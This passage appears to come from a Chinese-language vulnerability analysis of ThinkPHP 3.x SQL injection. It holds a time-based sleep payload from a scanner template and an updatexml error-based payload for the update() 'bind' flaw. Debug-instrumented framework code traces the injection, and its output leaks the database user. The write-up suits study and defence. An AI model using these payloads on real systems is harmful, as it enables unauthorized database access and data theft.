      Content-Type: application/x-www-form-urlencoded
    data: "----------641902708\nContent-Disposition: form-data; name=\"couponid\"\n\
      \n1') union select sleep(10)#\n----------641902708--"
    follow_redirects: true
    matches: (code.eq("200") && time.egt("10"))
```

五、ThinkPHP 3.X update方法 SQL注入

描述：

由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入



分析：

demo代码

url：http://localhost/thinkphp-3.2.3/index.php/Home/Index/updateSql?nickname[]=bind&nickname[]=0%20and%201=(updatexml(1,concat(0x7e,(user())),1))%23&email=admin@emal.com

```
public function updateSql()
{
    $user = M('user');
    $u['nickname'] = I('nickname');
    $data['email']= I('email');
    $res = $user->where($u)->save($data);
}
```





```
public function save($data = '', $options = array())
{
	echo "<pre>调试输出：\n";
    echo ">>> [DEBUG] Enter save()\n";

    if (empty($data)) {
        echo "[DEBUG] 参数 \$data 为空，尝试使用 \$this->data\n";

        if (!empty($this->data)) {
            $data = $this->data;
            $this->data = array();
            echo "[DEBUG] 使用 \$this->data 初始化 \$data: ";
            var_dump($data);
        } else {
            $this->error = L('_DATA_TYPE_INVALID_');
            echo "[ERROR] 无效的数据类型\n";
            return false;
        }
    }

    // 数据处理
    $data = $this->_facade($data);
    echo "[DEBUG] _facade 处理后的数据: ";
    var_dump($data);

    if (empty($data)) {
        $this->error = L('_DATA_TYPE_INVALID_');
        echo "[ERROR] _facade 处理后数据为空\n";
        return false;
    }

    // 分析表达式
    $options = $this->_parseOptions($options);
    echo "[DEBUG] 解析后的 options: ";
    var_dump($options);

    $pk = $this->getPk();
    echo "[DEBUG] 获取主键字段: {$pk}\n";

    if (!isset($options['where'])) {
        echo "[DEBUG] where 条件未设置，尝试从数据中提取主键\n";

        if (is_string($pk) && isset($data[$pk])) {
            $where[$pk] = $data[$pk];
            unset($data[$pk]);
        } elseif (is_array($pk)) {
            foreach ($pk as $field) {
                if (isset($data[$field])) {
                    $where[$field] = $data[$field];
                } else {
                    $this->error = L('_OPERATION_WRONG_');
                    echo "[ERROR] 缺少复合主键字段: {$field}\n";
                    return false;
                }
                unset($data[$field]);
            }
        }

        if (!isset($where)) {
            $this->error = L('_OPERATION_WRONG_');
            echo "[ERROR] 未能构造 where 条件\n";
            return false;
        } else {
            $options['where'] = $where;
        }
    }

    if (is_array($options['where']) && isset($options['where'][$pk])) {
        $pkValue = $options['where'][$pk];
        echo "[DEBUG] 提取主键值: ";
        var_dump($pkValue);
    }

    echo "[DEBUG] 调用 _before_update()\n";
    if (false === $this->_before_update($data, $options)) {
        echo "[ERROR] _before_update() 返回 false\n";
        return false;
    }

    echo "[DEBUG] 调用 db->update()\n";
    $result = $this->db->update($data, $options);
    echo "[DEBUG] update 返回结果: ";
    var_dump($result);

    if (false !== $result && is_numeric($result)) {
        if (isset($pkValue)) {
            $data[$pk] = $pkValue;
        }

        echo "[DEBUG] 调用 _after_update()\n";
        $this->_after_update($data, $options);
    }

    echo "[DEBUG] 返回结果: ";
    var_dump($result);
	echo "</pre>";
    return $result;
}
```





```
public function update($data, $options)
{
	echo "<pre>调试输出：\n";
    echo ">>> [DEBUG] Enter update()\n";

    $this->model = $options['model'];
    echo "[DEBUG] 模型名: {$this->model}\n";

    $this->parseBind(!empty($options['bind']) ? $options['bind'] : array());

    $table = $this->parseTable($options['table']);
    echo "[DEBUG] 解析后的表名: {$table}\n";

    $sql = 'UPDATE ' . $table . $this->parseSet($data);
    echo "[DEBUG] 初始 SQL: {$sql}\n";

    if (strpos($table, ',')) {
        $join = $this->parseJoin(!empty($options['join']) ? $options['join'] : '');
        $sql .= $join;
        echo "[DEBUG] 添加 JOIN 子句: {$join}\n";
    }

    $where = $this->parseWhere(!empty($options['where']) ? $options['where'] : '');
    $sql .= $where;
    echo "[DEBUG] 添加 WHERE 子句: {$where}\n";

    if (!strpos($table, ',')) {
        $order = $this->parseOrder(!empty($options['order']) ? $options['order'] : '');
        $limit = $this->parseLimit(!empty($options['limit']) ? $options['limit'] : '');
        $sql .= $order . $limit;
        echo "[DEBUG] 添加 ORDER 子句: {$order}\n";
        echo "[DEBUG] 添加 LIMIT 子句: {$limit}\n";
    }

    $comment = $this->parseComment(!empty($options['comment']) ? $options['comment'] : '');
    $sql .= $comment;
    echo "[DEBUG] 添加注释: {$comment}\n";

    echo "[DEBUG] 最终 SQL: {$sql}\n";

    $result = $this->execute($sql, !empty($options['fetch_sql']) ? true : false);
    echo "[DEBUG] execute() 返回结果: ";
    var_dump($result);
	echo "</pre>";
    return $result;
}
```



```
protected function parseSet($data)
{	
	echo "<pre>调试输出：\n";
    $set = [];
    foreach ($data as $key => $val) {
        if (is_array($val) && 'exp' == $val[0]) {
            echo "[DEBUG] 表达式: {$key} = {$val[1]}\n";
            $set[] = $this->parseKey($key) . '=' . $val[1];
        } elseif (is_null($val)) {
            echo "[DEBUG] 空值: {$key} = NULL\n";
            $set[] = $this->parseKey($key) . '=NULL';
        } elseif (is_scalar($val)) {
            if (0 === strpos($val, ':') && in_array($val, array_keys($this->bind))) {
                echo "[DEBUG] 使用已有绑定: {$key} = {$val}\n";
                $set[] = $this->parseKey($key) . '=' . $this->escapeString($val);
            } else {
                $name  = count($this->bind);
                echo "[DEBUG] 自动绑定: {$key} => :{$name} (值: {$val})\n";
                $set[] = $this->parseKey($key) . '=:' . $name;
                $this->bindParam($name, $val);
            }
        }
    }
    $sql = ' SET ' . implode(',', $set);
    echo "[DEBUG] 最终 SET 子句: {$sql}\n";
	echo "</pre>";
    return $sql;
}
```



```
  /**
     * where分析
     * @access protected
     * @param mixed $where
     * @return string
     */
    protected function parseWhere($where)
    {
        $whereStr = '';
        if (is_string($where)) {
            // 直接使用字符串条件
            $whereStr = $where;
        } else {
            // 使用数组表达式
            $operate = isset($where['_logic']) ? strtoupper($where['_logic']) : '';
            if (in_array($operate, array('AND', 'OR', 'XOR'))) {
                // 定义逻辑运算规则 例如 OR XOR AND NOT
                $operate = ' ' . $operate . ' ';
                unset($where['_logic']);
            } else {
                // 默认进行 AND 运算
                $operate = ' AND ';
            }
            foreach ($where as $key => $val) {
                if (is_numeric($key)) {
                    $key = '_complex';
                }
                if (0 === strpos($key, '_')) {
                    // 解析特殊条件表达式
                    $whereStr .= $this->parseThinkWhere($key, $val);
                } else {
                    // 查询字段的安全过滤
                    // if(!preg_match('/^[A-Z_\|\&\-.a-z0-9\(\)\,]+$/',trim($key))){
                    //     E(L('_EXPRESS_ERROR_').':'.$key);
                    // }
                    // 多条件支持
                    $multi = is_array($val) && isset($val['_multi']);
                    $key   = trim($key);
                    if (strpos($key, '|')) {
                        // 支持 name|title|nickname 方式定义查询字段
                        $array = explode('|', $key);
                        $str   = array();
                        foreach ($array as $m => $k) {
                            $v     = $multi ? $val[$m] : $val;
                            $str[] = $this->parseWhereItem($this->parseKey($k), $v);
                        }
                        $whereStr .= '( ' . implode(' OR ', $str) . ' )';
                    } elseif (strpos($key, '&')) {
                        $array = explode('&', $key);
                        $str   = array();
                        foreach ($array as $m => $k) {
                            $v     = $multi ? $val[$m] : $val;
                            $str[] = '(' . $this->parseWhereItem($this->parseKey($k), $v) . ')';
                        }
                        $whereStr .= '( ' . implode(' AND ', $str) . ' )';
                    } else {
                        $whereStr .= $this->parseWhereItem($this->parseKey($key), $val);
                    }
                }
                $whereStr .= $operate;
            }
            $whereStr = substr($whereStr, 0, -strlen($operate));
        }
        return empty($whereStr) ? '' : ' WHERE ' . $whereStr;
    }
```



```
  protected function parseWhereItem($key, $val)
    {
        $whereStr = '';
        if (is_array($val)) {
            if (is_string($val[0])) {
                $exp = strtolower($val[0]);
                if (preg_match('/^(eq|neq|gt|egt|lt|elt)$/', $exp)) {
                    // 比较运算
                    $whereStr .= $key . ' ' . $this->exp[$exp] . ' ' . $this->parseValue($val[1]);
                } elseif (preg_match('/^(notlike|like)$/', $exp)) {
// 模糊查找
                    if (is_array($val[1])) {
                        $likeLogic = isset($val[2]) ? strtoupper($val[2]) : 'OR';
                        if (in_array($likeLogic, array('AND', 'OR', 'XOR'))) {
                            $like = array();
                            foreach ($val[1] as $item) {
                                $like[] = $key . ' ' . $this->exp[$exp] . ' ' . $this->parseValue($item);
                            }
                            $whereStr .= '(' . implode(' ' . $likeLogic . ' ', $like) . ')';
                        }
                    } else {
                        $whereStr .= $key . ' ' . $this->exp[$exp] . ' ' . $this->parseValue($val[1]);
                    }
                } elseif ('bind' == $exp) {
                    // 使用表达式
                    $whereStr .= $key . ' = :' . $val[1];
                } elseif ('exp' == $exp) {
                    // 使用表达式
                    $whereStr .= $key . ' ' . $val[1];
                } elseif (preg_match('/^(notin|not in|in)$/', $exp)) {
                    // IN 运算
                    if (isset($val[2]) && 'exp' == $val[2]) {
                        $whereStr .= $key . ' ' . $this->exp[$exp] . ' ' . $val[1];
                    } else {
                        if (is_string($val[1])) {
                            $val[1] = explode(',', $val[1]);
                        }
                        $zone = implode(',', $this->parseValue($val[1]));
                        $whereStr .= $key . ' ' . $this->exp[$exp] . ' (' . $zone . ')';
                    }
                } elseif (preg_match('/^(notbetween|not between|between)$/', $exp)) {
                    // BETWEEN运算
                    $data = is_string($val[1]) ? explode(',', $val[1]) : $val[1];
                    $whereStr .= $key . ' ' . $this->exp[$exp] . ' ' . $this->parseValue($data[0]) . ' AND ' . $this->parseValue($data[1]);
                } else {
                    E(L('_EXPRESS_ERROR_') . ':' . $val[0]);
                }
            } else {
                $count = count($val);
                $rule  = isset($val[$count - 1]) ? (is_array($val[$count - 1]) ? strtoupper($val[$count - 1][0]) : strtoupper($val[$count - 1])) : '';
                if (in_array($rule, array('AND', 'OR', 'XOR'))) {
                    $count = $count - 1;
                } else {
                    $rule = 'AND';
                }
                for ($i = 0; $i < $count; $i++) {
                    $data = is_array($val[$i]) ? $val[$i][1] : $val[$i];
                    if ('exp' == strtolower($val[$i][0])) {
                        $whereStr .= $key . ' ' . $data . ' ' . $rule . ' ';
                    } else {
                        $whereStr .= $this->parseWhereItem($key, $val[$i]) . ' ' . $rule . ' ';
                    }
                }
                $whereStr = '( ' . substr($whereStr, 0, -4) . ' )';
            }
        } else {
            //对字符串类型字段采用模糊匹配
            $likeFields = $this->config['db_like_fields'];
            if ($likeFields && preg_match('/^(' . $likeFields . ')$/i', $key)) {
                $whereStr .= $key . ' LIKE ' . $this->parseValue('%' . $val . '%');
            } else {
                $whereStr .= $key . ' = ' . $this->parseValue($val);
            }
        }
        return $whereStr;
    }
```



输出

```
调试输出：
>>> [DEBUG] Enter save()
[DEBUG] _facade 处理后的数据: array(1) {
  ["email"]=>
  string(14) "admin@emal.com"
}
[DEBUG] 解析后的 options: array(3) {
  ["where"]=>
  array(1) {
    ["nickname"]=>
    array(2) {
      [0]=>
      string(4) "bind"
      [1]=>
      string(47) "0 and 1=(updatexml(1,concat(0x7e,(user())),1))#"
    }
  }
  ["table"]=>
  string(10) "think_user"
  ["model"]=>
  string(4) "user"
}
[DEBUG] 获取主键字段: id
[DEBUG] 调用 _before_update()
[DEBUG] 调用 db->update()
调试输出：
>>> [DEBUG] Enter update()
[DEBUG] 模型名: user
[DEBUG] 解析后的表名: `think_user`
调试输出：
[DEBUG] 自动绑定: email => :0 (值: admin@emal.com)
[DEBUG] 最终 SET 子句:  SET `email`=:0
[DEBUG] 初始 SQL: UPDATE `think_user` SET `email`=:0
[DEBUG] 添加 WHERE 子句:  WHERE `nickname` = :0 and 1=(updatexml(1,concat(0x7e,(user())),1))#
输入参数:
string(0) ""
[DEBUG] 添加 ORDER 子句: 
[DEBUG] 添加 LIMIT 子句: 
[DEBUG] 添加注释: 
[DEBUG] 最终 SQL: UPDATE `think_user` SET `email`=:0 WHERE `nickname` = :0 and 1=(updatexml(1,concat(0x7e,(user())),1))#








:(


1105:XPATH syntax error: '~root@localhost'
 [ SQL语句 ] : UPDATE `think_user` SET `email`='admin@emal.com' WHERE `nickname` = 'admin@emal.com' and 1=(updatexml(1,concat(0x7e,(user())),1))#
```

利用过程

```
[入口] index.php?nickname[]=bind&nickname[]=0 and 1=(updatexml(1,concat(0x7e,(user())),1))#&email=admin@emal.com

==> IndexController::updateSql()
    ==> I('nickname') // => array('bind', '注入语句')
    ==> $u['nickname'] = I('nickname')
    ==> $user->where($u)->save($data)

==> Model::save()
    ==> _facade($data) // email 被处理
    ==> _parseOptions()  // 将 where 条件放入 $options
        ==> ['where' => ['nickname' => ['bind', 'payload']]]
    ==> $this->db->update($data, $options)

==> Db::update()
    ==> parseTable() // 表名解析
    ==> parseSet($data) // 生成 SET email = :0
    ==> parseWhere($options['where'])
        ==> parseWhereItem()
            ==> nickname = :0 AND 1=(updatexml(...))#
    ==> 拼接最终 SQL:
        UPDATE `think_user` SET `email`=:0 WHERE `nickname` = :0 and 1=(updatexml(...))

==> execute($sql, false)
    ==> SQL 注入触发

```

六、ThinkPHP 3.X where SQL注入

